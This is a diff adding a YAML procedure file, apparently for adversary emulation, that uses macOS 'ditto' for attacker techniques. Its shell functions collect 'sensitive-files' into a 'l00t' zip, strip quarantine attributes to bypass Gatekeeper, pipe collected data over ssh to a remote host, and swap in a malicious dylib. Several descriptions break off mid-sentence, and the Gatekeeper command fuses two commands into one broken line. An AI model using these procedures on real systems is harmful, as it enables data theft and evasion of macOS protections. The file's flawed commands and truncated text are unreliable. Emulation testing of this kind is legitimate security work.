@@ -1,0 +1,104 @@
+procedure_name: ditto
+tactic: Defense Evasion
+ttp_id: T1036.005
+guid: 88f59e87-8ca6-4c6e-a1b0-8ee9cecfd6b6
+intent: Copy files and directories while preserving file attributes and permissions.
+  Sourced from LOOBins; confirm MITRE mapping for each enabled option.
+author: Brendan Chamberlain (@infosecB)
+created: '2023-05-04'
+updated: '2026-05-03'
+version: 1.0.4
+platform:
+- darwin
+detection: []
+resources:
+- link: https://www.loobins.io/
+  description: "LOOBins \u2014 Living Off The Orchard macOS binaries"
+- link: https://attack.mitre.org/techniques/T1036/005/
+  description: "MITRE ATT&CK \u2014 T1036.005"
+- link: ''
+  description: ''
+- link: https://ss64.com/osx/ditto.html
+  description: ditto man page
+- link: https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/
+  description: "Gatekeeper\u2019s Achilles heel: Unearthing a macOS vulnerability"
+- link: https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/
+  description: Jamf Threat Labs identifies Safari vulnerability allowing for Gatekeeper
+    bypass
+acknowledgement:
+- person: ''
+  handle: ''
+procedure:
+  arguments:
+  - option: --copy-and-compress-sensitive-data-locally
+    description: The following command gathers and compresses (-c) files from the
+      specified folder and writes them to
+    execute_function:
+    - execute_copy_compress_sensitive_data_locally
+  - option: --remove-extended-attributes-from-a-file
+    description: ditto can be used to bypass Gatekeeper by removing the "com.apple.quarantine"
+      extended attribute.
+    execute_function:
+    - execute_remove_extended_attributes_from_file
+  - option: --copy-compress-and-transfer-sensitive-data-to-a-remote-macos-host
+    description: The following command gathers and compresses (-c) files from the
+      specified folder and writes them to
+    execute_function:
+    - execute_copy_compress_transfer_sensitive_data_remote_macos_host
+  - option: --dll-hjiacking
+    description: Replace a legitimate library with a malicious one while maintaining
+      the original file permissions an
+    execute_function:
+    - execute_dll_hjiacking
+  global_variable:
+  - name: CMD_DITTO
+    type: string
+    default_value: /usr/bin/ditto
+  functions:
+  - name: execute_copy_compress_sensitive_data_locally
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_copy_compress_sensitive_data_locally() {\n    local result\n  \
+      \  result=$(ditto -c -k --sequesterRsrc --keepParent /home/user/sensitive-files\
+      \ /tmp/l00t.zip 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return\
+      \ 0\n}"
+  - name: execute_remove_extended_attributes_from_file
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_remove_extended_attributes_from_file() {\n    local result\n  \
+      \  result=$(ditto -c -k unsigned.app app.zip ditto -x -k app.zip unsigned.app\
+      \ 2>/dev/null 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\n\" \"$result\"\n    return\
+      \ 0\n}"
+  - name: execute_copy_compress_transfer_sensitive_data_remote_macos_host
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_copy_compress_transfer_sensitive_data_remote_macos_host() {\n \
+      \   local result\n    result=$(ditto -c --norsrc /home/user/sensitive-files\
+      \ - | ssh remote_host ditto -x --norsrc - /home/user/l00t 2>&1)\n    $CMD_PRINTF\
+      \ \"RESULT|%s\\n\" \"$result\"\n    return 0\n}"
+  - name: execute_dll_hjiacking
+    type: main
+    language:
+    - shell
+    opsec:
+      check_fda:
+        enabled: false
+        exit_on_failure: true
+    code: "execute_dll_hjiacking() {\n    local result\n    result=$(ditto -V /path/to/malicious-library/malicious_library.dylib\
+      \ /path/to/target-library/original_library.dylib 2>&1)\n    $CMD_PRINTF \"RESULT|%s\\\
+      n\" \"$result\"\n    return 0\n}"
